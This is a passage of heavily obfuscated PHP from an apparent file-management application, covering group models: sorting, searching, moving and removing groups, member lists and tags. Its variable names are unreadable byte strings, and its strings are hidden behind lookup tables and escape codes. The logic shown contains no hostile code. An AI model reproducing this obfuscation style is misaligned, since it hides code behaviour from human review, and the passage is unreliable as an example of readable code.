$çËÏÓ‹î[$Ï¯†õÃ[28]]; } if (!Input::check($‰ÀÑÛ“—, $Ï¯†õÃ[591])) { $this->metaSet($ÚûÄ«²…, $Ï¯†õÃ[468], null); $this->metaSet($ÚûÄ«²…, $Ï¯†õÃ[467], null); return; } $™†‚¿£“ = array($Ï¯†õÃ[468] => str_replace($Ï¯†õÃ[50], $Ï¯†õÃ[33], Pinyin::get($‰ÀÑÛ“—)), $Ï¯†õÃ[467] => Pinyin::get($‰ÀÑÛ“—, $Ï¯†õÃ[592])); $this->metaSet($ÚûÄ«²…, $™†‚¿£“); } protected function groupStatus($°Èë¶õ, $¬©®ØÍ•) { $İÖŞ¢–‡ =& $_SERVER[Á÷ ­Šë]; $ ¨Åû”Œ = $this->getInfoSimple($°Èë¶õ); if (!$ ¨Åû”Œ) { return !1; } if ($¬©®ØÍ• == $İÖŞ¢–‡[97]) { $ºÒ˜Ñ†¿ = $this->parentLevelArray($ ¨Åû”Œ[$İÖŞ¢–‡[525]]); } else { $ÅšÄ¾³º = array($İÖŞ¢–‡[588] => array($İÖŞ¢–‡[548], $ ¨Åû”Œ[$İÖŞ¢–‡[525]] . $ ¨Åû”Œ[$İÖŞ¢–‡[1742]] . $İÖŞ¢–‡[549])); $ºÒ˜Ñ†¿ = $this->where($ÅšÄ¾³º)->field($İÖŞ¢–‡[1742])->select(); $ºÒ˜Ñ†¿ = array_to_keyvalue($ºÒ˜Ñ†¿, $İÖŞ¢–‡[33], $İÖŞ¢–‡[1742]); } $ºÒ˜Ñ†¿[] = $ ¨Åû”Œ[$İÖŞ¢–‡[1742]]; $²¦”ñÌÒ = array(); foreach ($ºÒ˜Ñ†¿ as $°Èë¶õ) { $²¦”ñÌÒ[] = array($İÖŞ¢–‡[1742] => $°Èë¶õ, $İÖŞ¢–‡[103] => $İÖŞ¢–‡[745], $İÖŞ¢–‡[381] => $¬©®ØÍ•); $this->_clearCache($°Èë¶õ); } return Model($İÖŞ¢–‡[1830])->addAll($²¦”ñÌÒ, array(), !0); } protected function groupRemove($Ş¤“ĞĞš) { $„–Şâ”‰ =& $_SERVER[Á÷ ­Šë]; $ôëÂ—ŞŞ = array($„–Şâ”‰[1742] => $Ş¤“ĞĞš); $¥‡‘†õ = $this->where($ôëÂ—ŞŞ)->find(); if (!$¥‡‘†õ || $¥‡‘†õ[$„–Şâ”‰[502]] == 0) { return !1; } $—Íı¢Åú = $this->getInfoSimple($¥‡‘†õ[$„–Şâ”‰[502]]); $this->_changeChildLevel($¥‡‘†õ, $—Íı¢Åú, !0); $this->where(array($„–Şâ”‰[502] => $Ş¤“ĞĞš))->save(array($„–Şâ”‰[502] => $¥‡‘†õ[$„–Şâ”‰[502]])); Model($„–Şâ”‰[1830])->where($ôëÂ—ŞŞ)->delete(); Model($„–Şâ”‰[1831])->where($ôëÂ—ŞŞ)->delete(); Model($„–Şâ”‰[827])->groupRootRemove($Ş¤“ĞĞš); return $this->where($ôëÂ—ŞŞ)->delete(); } protected function groupSort($³ÂÀ›Çé) { $Ğ›Ú–™‚ =& $_SERVER[Á÷ ­Šë]; $™©‹éÎÀ = array(); foreach ($³ÂÀ›Çé as $×Ç¶öô– => $›Ï„ÜÎ) { $™©‹éÎÀ[] = array($Ğ›Ú–™‚[1742], $›Ï„ÜÎ, $Ğ›Ú–™‚[1765], $×Ç¶öô– + 1); } $this->saveAll($™©‹éÎÀ); } public function listData() { $‰ªö¢ü± = $this->_makeOrder()->selectPage(50); $this->_listDataApply($‰ªö¢ü±[$_SERVER[Á÷ ­Šë][376]]); return $‰ªö¢ü±; } private function _makeOrder($Ü§îÈ­„ = '') { $’«äÃ× =& $_SERVER[Á÷ ­Šë]; $ö¾À®ì¦ = array($’«äÃ×[1742], $’«äÃ×[28], $’«äÃ×[1730], $’«äÃ×[204]); $¦Ô¢…é = array($’«äÃ×[452] => $’«äÃ×[453], $’«äÃ×[454] => $’«äÃ×[455]); $À¡ì±Ä = Input::get($’«äÃ×[459], $’«äÃ×[7], $’«äÃ×[1746], $ö¾À®ì¦); $× ¾ÜÆ¦ = Input::get($’«äÃ×[460], $’«äÃ×[7], $’«äÃ×[1832], array($’«äÃ×[1832], $’«äÃ×[454])); $× ¾ÜÆ¦ = $¦Ô¢…é[$× ¾ÜÆ¦]; $Ü§îÈ­„ = $Ü§îÈ­„ . "{$À¡ì±Ä}\40{$× ¾ÜÆ¦}\54\x20\x67\x72\157\165\160\x49\x44\x20\x61\163\143"; return $this->order($Ü§îÈ­„); } public function listChild($ô„½Î®€) { $„ÌÛ€ÀÇ =& $_SERVER[Á÷ ­Šë]; $‚†¾…‚ = $this->where(array($„ÌÛ€ÀÇ[502] => $ô„½Î®€))->_makeOrder()->selectPage(200); $this->_listDataApply($‚†¾…‚[$„ÌÛ€ÀÇ[376]]); return $‚†¾…‚; } public function listByID($ûÉÏåé•) { $¹‚÷çŸ½ =& $_SERVER[Á÷ ­Šë]; if (!$ûÉÏåé•) { return array(); } $õñ€Ò = array($¹‚÷çŸ½[1742] => array($¹‚÷çŸ½[7], $ûÉÏåé•)); $¯Ş Çİø = $this->where($õñ€Ò)->select(); $¯Ş Çİø = array_sort_keep($¯Ş Çİø, $¹‚÷çŸ½[1742], $ûÉÏåé•); $this->_listDataApply($¯Ş Çİø); return $¯Ş Çİø; } public function listSearch($İ˜Š¨¤€) { $¯àÖ¶»£ =& $_SERVER[Á÷ ­Šë]; $¢½½ºóÌ = $İ˜Š¨¤€[$¯àÖ¶»£[1833]]; $ï‡§ô› = isset($İ˜Š¨¤€[$¯àÖ¶»£[1834]]) ? $İ˜Š¨¤€[$¯àÖ¶»£[1834]] : !1; if (!trim($¢½½ºóÌ)) { return !1; } $¢½½ºóÌ = str_replace($¯àÖ¶»£[1835], $¯àÖ¶»£[1836], $¢½½ºóÌ); $»ô½òĞØ = array($¯àÖ¶»£[1742] => array($¯àÖ¶»£[390], "{$¢½½ºóÌ}\x25"), $¯àÖ¶»£[28] => array($¯àÖ¶»£[390], "\x25{$¢½½ºóÌ}\x25"), $¯àÖ¶»£[992] => $¯àÖ¶»£[1837]); if ($ï‡§ô›) { $¯‰ù­Ø = $this->getInfoSimple($ï‡§ô›); $õÖø”Ù˜ = $¯‰ù­Ø[$¯àÖ¶»£[525]] . $ï‡§ô› . $¯àÖ¶»£[549]; $»ô½òĞØ = array($»ô½òĞØ, array($¯àÖ¶»£[525] => array($¯àÖ¶»£[390], $õÖø”Ù˜))); } $»ô½òĞØ = $this->parseWhereLike($»ô½òĞØ); $Ü“º÷“Ñ = $this->_makeOrder()->where($»ô½òĞØ)->selectPage(20); $Ü“º÷“Ñ = $Ü“º÷“Ñ ? $Ü“º÷“Ñ : array($¯àÖ¶»£[376] => array(), $¯àÖ¶»£[373] => array()); if (!$Ü“º÷“Ñ || count($Ü“º÷“Ñ[$¯àÖ¶»£[376]]) < 5 && Input::check($¢½½ºóÌ, $¯àÖ¶»£[325])) { $µ‡‡ñ¦÷ = $this->groupChildrenAll($ï‡§ô›); $¾†À¸–û = $this->_searchFromMeta($¯àÖ¶»£[467], $¢½½ºóÌ, 10, $µ‡‡ñ¦÷); $ãù¼‡Æ¨ = $this->_searchFromMeta($¯àÖ¶»£[468], $¢½½ºóÌ, 10, $µ‡‡ñ¦÷); $Œİ£å®  = array_merge($¾†À¸–û, $ãù¼‡Æ¨, $Ü“º÷“Ñ[$¯àÖ¶»£[376]]); $Ü“º÷“Ñ[$¯àÖ¶»£[376]] = array_unique_by_key($Œİ£å® , $¯àÖ¶»£[1742]); $Ü“º÷“Ñ[$¯àÖ¶»£[373]][$¯àÖ¶»£[374]] = count($Ü“º÷“Ñ[$¯àÖ¶»£[376]]); $Ü“º÷“Ñ[$¯àÖ¶»£[373]][$¯àÖ¶»£[375]] = ceil($Ü“º÷“Ñ[$¯àÖ¶»£[373]][$¯àÖ¶»£[374]] / $Ü“º÷“Ñ[$¯àÖ¶»£[373]][$¯àÖ¶»£[370]]); } $this->_listDataApply($Ü“º÷“Ñ[$¯àÖ¶»£[376]]); return $Ü“º÷“Ñ; } protected function groupChildrenAll($·‘¾„â) { $ÍÂŸ»ˆÑ =& $_SERVER[Á÷ ­Šë]; if (!$·‘¾„â) { return !1; } if (is_string($·‘¾„â)) { $·‘¾„â = array($·‘¾„â); } $ŞÂÒ« = $·‘¾„â; foreach ($·‘¾„â as $¨°©Ü‡¹) { $Ó—ğ÷€Ò = $this->getInfoSimple($¨°©Ü‡¹); $¸à™¢é¸ = array($ÍÂŸ»ˆÑ[525] => array($ÍÂŸ»ˆÑ[390], $Ó—ğ÷€Ò[$ÍÂŸ»ˆÑ[525]] . $¨°©Ü‡¹ . $ÍÂŸ»ˆÑ[549])); $¨Á…ä§ = $this->field($ÍÂŸ»ˆÑ[1742])->where($¸à™¢é¸)->select(); $ŞÂÒ« = array_merge($ŞÂÒ«, array_to_keyvalue($¨Á…ä§, $ÍÂŸ»ˆÑ[33], $ÍÂŸ»ˆÑ[1742])); } return array_unique($ŞÂÒ«); } private function _searchFromMeta($—ğúÛĞ, $ĞĞâ®Ñ, $Ö«ë±„–, $« ³¤Ş€) { $ˆ±ƒˆı =& $_SERVER[Á÷ ­Šë]; $ĞĞâ®Ñ = strtolower($ĞĞâ®Ñ); $ÏìùõÍ = array($ˆ±ƒˆı[103] => $—ğúÛĞ, $ˆ±ƒˆı[381] => array($ˆ±ƒˆı[390], "\45{$ĞĞâ®Ñ}\45")); $ÏìùõÍ = $this->parseWhereLike($ÏìùõÍ); if ($« ³¤Ş€) { $ÏìùõÍ[$ˆ±ƒˆı[1742]] = array($ˆ±ƒˆı[7], $« ³¤Ş€); } $˜óšŠä’ = Model($ˆ±ƒˆı[1838])->where($ÏìùõÍ)->limit($Ö«ë±„–)->select(); if (!$˜óšŠä’) { return array(); } $˜óšŠä’ = array_to_keyvalue($˜óšŠä’, $ˆ±ƒˆı[33], $ˆ±ƒˆı[1742]); $„±Üü¨ı = $this->where(array($ˆ±ƒˆı[1829] => array($ˆ±ƒˆı[7], $˜óšŠä’)))->select(); if (!$„±Üü¨ı) { return array(); } return $„±Üü¨ı; } protected function _listDataApplyItem($³‰±×Úâ) { $ƒ‹ÉÎ = array($³‰±×Úâ); $this->_listDataApply($ƒ‹ÉÎ); return $ƒ‹ÉÎ[0]; } protected function _listDataApply(&$ú®‰şò) { $£İâÊ²ƒ =& $_SERVER[Á÷ ­Šë]; if (!$ú®‰şò) { return; } $Úåèõô” = array_to_keyvalue($ú®‰şò, $£İâÊ²ƒ[33], $£İâÊ²ƒ[1742]); $this->_listAppendChildren($ú®‰şò); $this->_listAppendChildrenMember($ú®‰şò); $this->_listAppendMeta($ú®‰şò, $Úåèõô”); $this->_listAppendParent($ú®‰şò); $this->_listAppendSourceRoot($ú®‰şò, $Úåèõô”); } private function _listAppendChildren(&$¿÷ª âÑ) { $Í¼ÖıĞ =& $_SERVER[Á÷ ­Šë]; $Åô¤ŞÉƒ = array_to_keyvalue($¿÷ª âÑ, $Í¼ÖıĞ[33], $Í¼ÖıĞ[1742]); $¸¡»Ò¡ = array($Í¼ÖıĞ[502] => array($Í¼ÖıĞ[7], $Åô¤ŞÉƒ)); $ÂÌ§‹  = array($Í¼ÖıĞ[502], $Í¼ÖıĞ[1839] => $Í¼ÖıĞ[504]); $²…„‡Ó¦ = $this->field($ÂÌ§‹ )->where($¸¡»Ò¡)->group($Í¼ÖıĞ[502])->select(); $àü›Š£ = array_to_keyvalue($²…„‡Ó¦, $Í¼ÖıĞ[502], $Í¼ÖıĞ[504]); foreach ($¿÷ª âÑ as &$üÓŸ÷Üæ) { $­ˆŒ–¨ = $üÓŸ÷Üæ[$Í¼ÖıĞ[1742]]; $üÓŸ÷Üæ[$Í¼ÖıĞ[1840]] = isset($àü›Š£[$­ˆŒ–¨]) ? intval($àü›Š£[$­ˆŒ–¨]) : !1; } unset($üÓŸ÷Üæ); } private function _listAppendChildrenMember(&$€ıÊ‹úş) { $ß‚ø·ÏĞ =& $_SERVER[Á÷ ­Šë]; $´Ù‚í¹ = array_to_keyvalue($€ıÊ‹úş, $ß‚ø·ÏĞ[33], $ß‚ø·ÏĞ[1742]); $»Óø«²î = array($ß‚ø·ÏĞ[1742] => array($ß‚ø·ÏĞ[7], $´Ù‚í¹)); $¯Öù”À‡ = array($ß‚ø·ÏĞ[1742], $ß‚ø·ÏĞ[1839] => $ß‚ø·ÏĞ[504]); $éëØüù¹ = Model($ß‚ø·ÏĞ[1831])->field($¯Öù”À‡)->where($»Óø«²î)->group($ß‚ø·ÏĞ[1742])->select(); $„Üù‘´ = array_to_keyvalue($éëØüù¹, $ß‚ø·ÏĞ[1742], $ß‚ø·ÏĞ[504]); foreach ($€ıÊ‹úş as &$Ïâ‰œ·ñ) { $ç“äéİ = $Ïâ‰œ·ñ[$ß‚ø·ÏĞ[1742]]; $Ïâ‰œ·ñ[$ß‚ø·ÏĞ[1841]] = isset($„Üù‘´[$ç“äéİ]) ? intval($„Üù‘´[$ç“äéİ]) : !1; } unset($Ïâ‰œ·ñ); } private function _listAppendMeta(&$Ø”§ò‹, $½‰ê‰Ä¢) { $éêÅ¡Ù =& $_SERVER[Á÷ ­Šë]; $¨ÙÍ¦‰â = array($éêÅ¡Ù[1742] => array($éêÅ¡Ù[7], $½‰ê‰Ä¢)); $Á¸ˆİ“ = Model($éêÅ¡Ù[1830])->where($¨ÙÍ¦‰â)->select(); $Á¸ˆİ“ = array_to_keyvalue_group($Á¸ˆİ“, $éêÅ¡Ù[1742]); foreach ($Á¸ˆİ“ as &$ÇòÅà²Æ) { $ÇòÅà²Æ = array_to_keyvalue($ÇòÅà²Æ, $éêÅ¡Ù[103], $éêÅ¡Ù[381]); } unset($ÇòÅà²Æ); foreach ($Ø”§ò‹ as &$ß­äĞüË) { $ß­äĞüË[$éêÅ¡Ù[469]] = array(); if (isset($Á¸ˆİ“[$ß­äĞüË[$éêÅ¡Ù[1742]]])) { $ß­äĞüË[$éêÅ¡Ù[469]] = $Á¸ˆİ“[$ß­äĞüË[$éêÅ¡Ù[1742]]]; } } unset($ß­äĞüË); } protected function parentLevelArray($«Ôşìû•) { $øßÖ™ê‹ =& $_SERVER[Á÷ ­Šë]; $«Ôşìû• = explode($øßÖ™ê‹[47], trim($«Ôşìû•, $øßÖ™ê‹[47])); $«Ôşìû• = array_remove_value($«Ôşìû•, $øßÖ™ê‹[201]); return $«Ôşìû•; } private function _listAppendParent(&$„‹é¾‡ø) { $ÚË³‹Šğ =& $_SERVER[Á÷ ­Šë]; $¹šş³²Œ = array(); foreach ($„‹é¾‡ø as &$ÄÚê–Š) { $¹šş³²Œ[$ÄÚê–Š[$ÚË³‹Šğ[1742]]] = $ÄÚê–Š[$ÚË³‹Šğ[28]]; $õ‰ÉêÃ = $this->parentLevelArray($ÄÚê–Š[$ÚË³‹Šğ[525]]); foreach ($õ‰ÉêÃ as $’íç·æƒ) { if (!isset($¹šş³²Œ[$’íç·æƒ])) { $¹šş³²Œ[$’íç·æƒ] = 0; } } } unset($ÄÚê–Š); foreach ($¹šş³²Œ as $ÛÏØò¢™ => $âÔ‘Ş’) { if ($âÔ‘Ş’) { continue; } $³æåñ¬û = $this->getInfoSimple($ÛÏØò¢™); $¹šş³²Œ[$ÛÏØò¢™] = $³æåñ¬û[$ÚË³‹Šğ[28]]; } $Ì€¬·öÕ = $GLOBALS[$ÚË³‹Šğ[6]][$ÚË³‹Šğ[98]][$ÚË³‹Šğ[1842]]; if ($GLOBALS[$ÚË³‹Šğ[509]] == $ÚË³‹Šğ[97]) { $Ì€¬·öÕ = !1; } foreach ($„‹é¾‡ø as &$ÄÚê–Š) { $õ‰ÉêÃ = $this->parentLevelArray($ÄÚê–Š[$ÚË³‹Šğ[525]]); $´‰­©Ë­ = $ÚË³‹Šğ[33]; foreach ($õ‰ÉêÃ as $ÛÏØò¢™ => $’íç·æƒ) { if ($Ì€¬·öÕ && $ÛÏØò¢™ == 0) { continue; } $´‰­©Ë­ .= $¹šş³²Œ[$’íç·æƒ] . $ÚË³‹Šğ[8]; } if ($õ‰ÉêÃ) { $´‰­©Ë­ .= $ÄÚê–Š[$ÚË³‹Šğ[28]]; } $ÄÚê–Š[$ÚË³‹Šğ[530]] = str_replace($ÚË³‹Šğ[533], $ÚË³‹Šğ[8], $´‰­©Ë­); } unset($ÄÚê–Š); } private function _listAppendSourceRoot(&$´Óô«Š², $…Ë·Ñ) { $¼’Öƒ =& $_SERVER[Á÷ ­Šë]; $àÈãÑí“ = array($¼’Öƒ[502] => 0, $¼’Öƒ[508] => array($¼’Öƒ[7], $…Ë·Ñ), $¼’Öƒ[416] => SourceModel::TYPE_GROUP); $…ÄîÇàÌ = Model($¼’Öƒ[827])->order($¼’Öƒ[1843])->field($¼’Öƒ[1844]); $Ûìß ¦Ğ = $…ÄîÇàÌ->limit(count($…Ë·Ñ))->where($àÈãÑí“)->select(); $Ûìß ¦Ğ = array_to_keyvalue($Ûìß ¦Ğ, $¼’Öƒ[508]); $Ûìß ¦Ğ = array_remove_key($Ûìß ¦Ğ, $¼’Öƒ[508]); foreach ($´Óô«Š² as &$œı’ıñ¼) { $œı’ıñ¼[$¼’Öƒ[95]] = $Ûìß ¦Ğ[$œı’ıñ¼[$¼’Öƒ[1742]]] ? $Ûìß ¦Ğ[$œı’ıñ¼[$¼’Öƒ[1742]]] : array(); } unset($œı’ıñ¼); } protected function groupMerge($°Œ´Íºİ) { $°Œ´Íºİ = array_values(array_unique($°Œ´Íºİ)); $¹”ºŒá = array(); for ($ı¿©Ã = 0; $ı¿©Ã < count($°Œ´Íºİ); $ı¿©Ã++) { $Úö§ÀüĞ = !1; for ($±“ĞÂÔ½ = 0; $±“ĞÂÔ½ < count($°Œ´Íºİ); $±“ĞÂÔ½++) { if ($ı¿©Ã == $±“ĞÂÔ½) { continue; } if ($this->isParentOf($°Œ´Íºİ[$±“ĞÂÔ½], $°Œ´Íºİ[$ı¿©Ã])) { $Úö§ÀüĞ = !0; break; } } if (!$Úö§ÀüĞ) { $¹”ºŒá[] = $°Œ´Íºİ[$ı¿©Ã]; } } return $¹”ºŒá; } protected function isParentOf($ú“¿Ìº¿, $‡â½áİ¤) { $¼é½¤§» =& $_SERVER[Á÷ ­Šë]; if (!$ú“¿Ìº¿ || !$‡â½áİ¤ || $ú“¿Ìº¿ == $‡â½áİ¤) { return !1; } $ğ¾ï§ªö = $this->getInfoSimple($ú“¿Ìº¿); $–¯´×ï = $this->getInfoSimple($‡â½áİ¤); $§ıİ„ÍÑ = $ğ¾ï§ªö[$¼é½¤§»[525]] . $ú“¿Ìº¿ . $¼é½¤§»[47]; if (substr($–¯´×ï[$¼é½¤§»[525]], 0, strlen($§ıİ„ÍÑ)) == $§ıİ„ÍÑ) { return !0; } return !1; } public function groupShowRoot($ï—Âşá, $Å­¶úÛõ = false) { $ß°ÊØ–Á =& $_SERVER[Á÷ ­Šë]; $Üş¦·ˆİ = $this->getInfo($ï—Âşá); if (!$Üş¦·ˆİ) { return array(); } $²½Ê§Áš = $this->parentLevelArray($Üş¦·ˆİ[$ß°ÊØ–Á[525]]); $ù˜”¥Æà = array($ï—Âşá); if (count($²½Ê§Áš) == 0) { return $ù˜”¥Æà; } if ($Å­¶úÛõ && count($²½Ê§Áš) == 1) { return $ù˜”¥Æà; } if (!$Üş¦·ˆİ[$ß°ÊØ–Á[469]] || !isset($Üş¦·ˆİ[$ß°ÊØ–Á[469]][$ß°ÊØ–Á[1827]]) || $Üş¦·ˆİ[$ß°ÊØ–Á[469]][$ß°ÊØ–Á[1827]] == $ß°ÊØ–Á[1796]) { return $this->groupShowRoot($²½Ê§Áš[count($²½Ê§Áš) - 1], $Å­¶úÛõ); } if ($Üş¦·ˆİ[$ß°ÊØ–Á[469]][$ß°ÊØ–Á[1827]] == $ß°ÊØ–Á[364]) { $ì»Ó ¿Ù = explode($ß°ÊØ–Á[47], $Üş¦·ˆİ[$ß°ÊØ–Á[469]][$ß°ÊØ–Á[1828]]); if ($ì»Ó ¿Ù) { $ù˜”¥Æà = array_merge($ù˜”¥Æà, $ì»Ó ¿Ù); } } return $ù˜”¥Æà; } protected function resetParentLevel() { $³÷Š®Œ =& $_SERVER[Á÷ ­Šë]; $¬™ú úÁ = $³÷Š®Œ[1742]; $ÃĞĞ”Áã = $this->select(); $ÃĞĞ”Áã = array_to_keyvalue($ÃĞĞ”Áã, $¬™ú úÁ); foreach ($ÃĞĞ”Áã as $¦ìœ§Ò£) { $ôìåä½° = $¦ìœ§Ò£; $ ›ÒÉ—° = array(); while ($ôìåä½°[$³÷Š®Œ[502]] != 0) { $ ›ÒÉ—°[] = $ôìåä½°[$³÷Š®Œ[502]]; $ôìåä½° = $ÃĞĞ”Áã[$ôìåä½°[$³÷Š®Œ[502]]]; } $ ›ÒÉ—°[] = 0; $ ›ÒÉ—° = $³÷Š®Œ[47] . implode($³÷Š®Œ[47], array_reverse($ ›ÒÉ—°)) . $³÷Š®Œ[47]; $this->setNamePinyin($¦ìœ§Ò£[$¬™ú úÁ], $¦ìœ§Ò£[$³÷Š®Œ[28]]); $this->where(array($¬™ú úÁ => $¦ìœ§Ò£[$¬™ú úÁ]))->save(array($³÷Š®Œ[588] => $ ›ÒÉ—°)); } return $ÃĞĞ”Áã; } public function groupNameAuto($óíà„Åµ, $‚‚ì£) { $°ãâ×Ï¼ =& $_SERVER[Á÷ ­Šë]; $ƒ«æªŸ€ = $this->where(array($°ãâ×Ï¼[406] => $óíà„Åµ))->getField($°ãâ×Ï¼[28], !0); if (!$ƒ«æªŸ€ || !in_array($‚‚ì£, $ƒ«æªŸ€)) { return $‚‚ì£; } for ($Î÷ÑìØ = 1; $Î÷ÑìØ <= count($ƒ«æªŸ€) + 1; $Î÷ÑìØ++) { $ùîß£Šº = $‚‚ì£ . "\x28{$Î÷ÑìØ}\x29"; if (!in_array($ùîß£Šº, $ƒ«æªŸ€)) { return $ùîß£Šº; } } } public function groupSwitch($İ¯ÓÏâ´, $—•åÎÈ) { $êİöú… =& $_SERVER[Á÷ ­Šë]; $çëí´ó = array($êİöú…[1742] => array($êİöú…[7], array($İ¯ÓÏâ´, $—•åÎÈ))); $·ù†¯¨‡ = $this->where($çëí´ó)->select(); $·ù†¯¨‡ = array_to_keyvalue($·ù†¯¨‡, $êİöú…[1742]); if (!isset($·ù†¯¨‡[$İ¯ÓÏâ´]) || !isset($·ù†¯¨‡[$—•åÎÈ]) || $·ù†¯¨‡[$İ¯ÓÏâ´][$êİöú…[502]] == 0) { return !1; } $çëí´ó = array($êİöú…[1742] => $İ¯ÓÏâ´); $ ³á½ÎÑ = Model($êİöú…[1831])->where($çëí´ó)->select(); if (!$ ³á½ÎÑ) { $ ³á½ÎÑ = array(); } foreach ($ ³á½ÎÑ as $À·Üò˜ş) { $†¨ˆÒ© = $À·Üò˜ş[$êİöú…[1574]]; $çëí´ó = array($êİöú…[1574] => $†¨ˆÒ©, $êİöú…[1742] => $—•åÎÈ); $šü²ÛĞ = Model($êİöú…[1831])->where($çëí´ó)->find(); if (!$šü²ÛĞ) { $¨Öì–Æ¡ = array($—•åÎÈ => $À·Üò˜ş[$êİöú…[1845]]); Model($êİöú…[542])->userGroupAdd($†¨ˆÒ©, $¨Öì–Æ¡); } Model($êİöú…[542])->userGroupRemove($†¨ˆÒ©, $İ¯ÓÏâ´); } $çëí´ó = array($êİöú…[416] => 2, $êİöú…[502] => 0, $êİöú…[415] => 1, $êİöú…[508] => array($êİöú…[7], array($İ¯ÓÏâ´, $—•åÎÈ))); $ç·Ìƒ = Model($êİöú…[827])->where($çëí´ó)->field($êİöú…[1846])->select(); $ç·Ìƒ = array_to_keyvalue($ç·Ìƒ, $êİöú…[508], $êİöú…[407]); $şÈ½æï¼ = !empty($ç·Ìƒ[$İ¯ÓÏâ´]) ? $ç·Ìƒ[$İ¯ÓÏâ´] : !1; if ($şÈ½æï¼) { if (!$ç·Ìƒ[$—•åÎÈ]) { $ç·Ìƒ[$—•åÎÈ] = Model($êİöú…[827])->groupRootAdd($—•åÎÈ); } $â‹Ö¡¤í = $ç·Ìƒ[$—•åÎÈ]; $çëí´ó = array($êİöú…[502] => $şÈ½æï¼); $ç·Ìƒ = Model($êİöú…[827])->where($çëí´ó)->field($êİöú…[1847])->select(); if (!$ç·Ìƒ) { $ç·Ìƒ = array(); } Model($êİöú…[827])->moveClearAuth = !1; foreach ($ç·Ìƒ as $ò¨Í×›) { $¾Â§ƒ“ = $ò¨Í×›[$êİöú…[415]] == $êİöú…[97] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($êİöú…[827])->move($ò¨Í×›[$êİöú…[407]], $â‹Ö¡¤í, $¾Â§ƒ“); } Model($êİöú…[827])->moveClearAuth = !0; $çëí´ó = array($êİöú…[416] => 2, $êİöú…[508] => $İ¯ÓÏâ´); $òí‘èÔï = array($êİöú…[508] => $—•åÎÈ); Model($êİöú…[1848])->where($çëí´ó)->save($òí‘èÔï); Model($êİöú…[1849])->where($çëí´ó)->save($òí‘èÔï); } $this->_changeChildLevel($·ù†¯¨‡[$İ¯ÓÏâ´], $·ù†¯¨‡[$—•åÎÈ], !0); $this->where(array($êİöú…[502] => $İ¯ÓÏâ´))->save(array($êİöú…[502] => $—•åÎÈ)); $this->_clearChildrenCache($·ù†¯¨‡[$—•åÎÈ]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\165\163\x65\162\x5f\x66\x61\166"; protected function cacheFunctionAlias($Ö¬±ªóî) { $õ«ö›½ =& $_SERVER[Á÷ ­Šë]; return array($õ«ö›½[1850] => array($Ö¬±ªóî[0], $õ«ö›½[1851]), $õ«ö›½[1852] => array($Ö¬±ªóî[0], $õ«ö›½[1853])); } protected function get($ã¾èøø©) { $ó±´úí£ =& $_SERVER[Á÷ ­Šë]; $ß»›š‰Œ = Model($ó±´úí£[526])->metaGet($ã¾èøø©, $ó±´úí£[1854]); $ı¨äÓÖ = json_decode($ß»›š‰Œ, !0); return $ı¨äÓÖ ? $ı¨äÓÖ : array($ó±´úí£[1855] => $ó±´úí£[97], $ó±´úí£[376] => array()); } protected function set($ªİÚ”³‚, $Ëçà›¬…) { $ŒÁø¶Üó =& $_SERVER[Á÷ ­Šë]; $Ëçà›¬… = $Ëçà›¬… ? $Ëçà›¬… : array($ŒÁø¶Üó[1855] => $ŒÁø¶Üó[97], $ŒÁø¶Üó[376] => array()); Model($ŒÁø¶Üó[526])->metaSet($ªİÚ”³‚, $ŒÁø¶Üó[1854], json_encode($Ëçà›¬…)); return Model($ŒÁø¶Üó[526])->metaSet($ªİÚ”³‚, $ŒÁø¶Üó[1854], json_encode($Ëçà›¬…)); } protected function getByTagID($¡ÌàïÂ, $èš¦÷ú˜) { $‘è°‚‚‰ =& $_SERVER[Á÷ ­Šë]; if (!$¡ÌàïÂ || !$èš¦÷ú˜) { return !1; } if (!Model($‘è°‚‚‰[526])->getInfoSimple($¡ÌàïÂ)) { return !1; } $Ô¸Å®º‰ = $this->get($¡ÌàïÂ); if (!$Ô¸Å®º‰ || !isset($Ô¸Å®º‰[$‘è°‚‚‰[376]])) { return !1; } $’±Éèıı = array_find_by_field($Ô¸Å®º‰[$‘è°‚‚‰[376]], $‘è°‚‚‰[404], $èš¦÷ú˜); return is_array($’±Éèıı) ? $’±Éèıı : !1; } public function listSource($õå¤Î’, $µƒ‡¹Úó) { $¦½”±³× =& $_SERVER[Á÷ ­Šë]; if ($µƒ‡¹Úó && !is_array($µƒ‡¹Úó)) { $µƒ‡¹Úó = array($µƒ‡¹Úó); } $ÇÖâ‰…Ó = $this->listData($õå¤Î’); $¥‘§¹¾¼ = array(); foreach ($ÇÖâ‰…Ó as $ˆŞï) { $ŸÖß¦ùÃ = $ˆŞï[$¦½”±³×[86]]; if (!$ŸÖß¦ùÃ) { continue; } if (!isset($¥‘§¹¾¼[$ŸÖß¦ùÃ])) { $¥‘§¹¾¼[$ŸÖß¦ùÃ] = array(); } $¥‘§¹¾¼[$ŸÖß¦ùÃ][] = $ˆŞï[$¦½”±³×[431]]; } $Í´Î´ƒ = array(); foreach ($¥‘§¹¾¼ as $å°Ûœšá => $ŞëÄëš) { $°›”ÎÆÉ = !0; if (!$µƒ‡¹Úó) { $Í´Î´ƒ[] = $å°Ûœšá; continue; } foreach ($µƒ‡¹Úó as $ëˆğƒÑÖ) { if (!in_array($ëˆğƒÑÖ, $ŞëÄëš)) { $°›”ÎÆÉ = !1; break; } } if ($°›”ÎÆÉ) { $Í´Î´ƒ[] = $å°Ûœšá; } } if (!$Í´Î´ƒ) { return array(); } $ñ·ÅòÕÅ = array($¦½”±³×[422] => array($¦½”±³×[423], $Í´Î´ƒ), $¦½”±³×[508] => $õå¤Î’, $¦½”±³×[416] => SourceModel::TYPE_GROUP); $Õà°¹š = Model($¦½”±³×[1249])->listSource($ñ·ÅòÕÅ); if (!$Õà°¹š || count($Í´Î´ƒ) == $Õà°¹š[$¦½”±³×[373]][$¦½”±³×[374]]) { return $Õà°¹š; } $’ÉãØ¨• = array(); $øç„œÑ = array_to_keyvalue($Õà°¹š[$¦½”±³×[85]], $¦½”±³×[33], $¦½”±³×[407]); $—ßÏÏá = array_to_keyvalue($Õà°¹š[$¦½”±³×[84]], $¦½”±³×[33], $¦½”±³×[407]); $¶‘€‡¯ = array_merge($—ßÏÏá, $øç„œÑ); foreach ($Í´Î´ƒ as $ŸÖß¦ùÃ) { if (!in_array($ŸÖß¦ùÃ, $¶‘€‡¯)) { $’ÉãØ¨•[] = $ŸÖß¦ùÃ; } } if ($’ÉãØ¨•) { $this->removeBySource($õå¤Î’, $’ÉãØ¨•); } return $Õà°¹š; } protected function listData($Ó˜êà) { $á‡Òş§¬ =& 